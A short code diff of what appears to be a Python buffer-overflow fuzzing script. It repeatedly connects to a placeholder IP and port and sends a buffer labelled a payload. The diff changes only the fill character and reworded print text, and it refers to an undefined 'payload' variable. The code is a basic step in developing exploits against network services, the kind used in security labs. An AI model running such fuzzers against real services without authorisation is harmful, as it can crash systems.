@@ -3,7 +3,7 @@
 import sys, socket
 from time import sleep
  
-buffer = "F" * 100
+buffer = "A" * 100
  
 while True:
     try:
@@ -11,7 +11,7 @@ while True:
  
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('IP',PORT))
-        print ("[+] Sending The Payload...\n" + str(len(buffer)))
+        print ("[+] Transmission The Payload...\n" + str(len(buffer)))
         s.send((payload.encode()))
         s.close()
         sleep(1)
